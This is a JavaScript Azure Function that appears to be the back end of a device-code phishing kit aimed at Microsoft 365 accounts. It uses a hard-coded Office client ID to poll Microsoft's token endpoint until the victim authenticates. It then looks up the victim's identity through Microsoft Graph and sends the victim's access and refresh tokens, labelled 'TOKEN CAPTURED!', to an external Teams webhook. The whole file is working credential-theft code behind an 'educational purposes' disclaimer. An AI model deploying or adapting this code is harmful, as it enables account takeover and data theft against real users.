/**
 * Azure Function Device Code Polling - Polls for token after user authenticates
 * 
 * This code is provided for educational purposes only and provided without any liability or warranty.
 */

const { app } = require("@azure/functions");
const axios = require('axios');

const client_id = '00b41c95-dab0-4487-9791-b9d2c32c80f2';
const token_endpoint = "https://login.microsoftonline.com/common/oauth2/token";
const teams_webhook_url = process.env.TEAMS_WEBHOOK_URI;

app.http("poll", {
  methods: ["PUT"],
  authLevel: "anonymous",
  route: "/deviceCode",
  handler: async (request, context) => {

    async function dispatchMessage(message) {
      context.log(message);
      if (teams_webhook_url) {
        await fetch(teams_webhook_url, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ text: message }),
        }).catch((error) => console.log(error));
      }
    }

    const request_body = await request.json();
    context.log(`Starting poll for device code...`);

    let tokenResponse = null;
    let poll_count = 0;
    const max_polls = 12 * 5; // 5 minutes at 5s intervals

    while (!tokenResponse && poll_count++ < max_polls) {
      tokenResponse = await axios.post(token_endpoint, {
        "client_id": client_id,
        "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
        "resource": "https://graph.microsoft.com",
        "code": request_body.device_code
      }, {
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          'User-Agent': 'AzureAiTMFunction'
        }
      }).then(response => response.data)
        .catch((ex) => {
          if (ex.response?.data?.error === "authorization_pending") {
            // User hasn't authenticated yet, keep polling
            context.log(`Polling... (${poll_count}/${max_polls})`);
          } else if (ex.response?.data?.error === "authorization_declined") {
            context.log("User declined authorization");
            dispatchMessage("❌ User declined device code authorization");
            return "declined";
          } else if (ex.response?.data?.error === "expired_token") {
            context.log("Device code expired");
            dispatchMessage("⏰ Device code expired before user authenticated");
            return "expired";
          } else {
            console.error(ex.response?.data || ex);
          }
          return null;
        });

      if (tokenResponse === "declined" || tokenResponse === "expired") {
        break;
      }

      if (!tokenResponse) {
        await new Promise(resolve => setTimeout(resolve, 5000));
      }
    }

    if (tokenResponse && typeof tokenResponse === 'object') {
      context.log("🎉 Token captured successfully!");
      
      // Get user info
      let userInfo = null;
      try {
        const meResponse = await fetch('https://graph.microsoft.com/v1.0/me', {
          headers: {
            'Authorization': `Bearer ${tokenResponse.access_token}`,
            'User-Agent': 'AzureAiTMFunction'
          }
        });
        userInfo = await meResponse.json();
      } catch (ex) {
        console.error("Failed to get user info:", ex);
      }

      // Send captured tokens to webhook
      await dispatchMessage(
        `🎉 <b>TOKEN CAPTURED!</b><br><br>` +
        `<b>User:</b> ${userInfo?.userPrincipalName || 'Unknown'}<br>` +
        `<b>Display Name:</b> ${userInfo?.displayName || 'Unknown'}<br>` +
        `<b>Email:</b> ${userInfo?.mail || 'N/A'}<br><br>` +
        `<b>Access Token:</b><br><code>${tokenResponse.access_token}</code><br><br>` +
        `<b>Refresh Token:</b><br><code>${tokenResponse.refresh_token || 'N/A'}</code><br><br>` +
        `<b>Expires In:</b> ${tokenResponse.expires_in}s<br>` +
        `<b>Scope:</b> ${tokenResponse.scope || 'N/A'}`
      );

      context.log(`User: ${userInfo?.userPrincipalName}`);
      context.log(`Access Token: ${tokenResponse.access_token.substring(0, 50)}...`);
      context.log(`Refresh Token: ${tokenResponse.refresh_token?.substring(0, 50) || 'N/A'}...`);
    }

    return new Response(null, { status: 204 });
  },
});
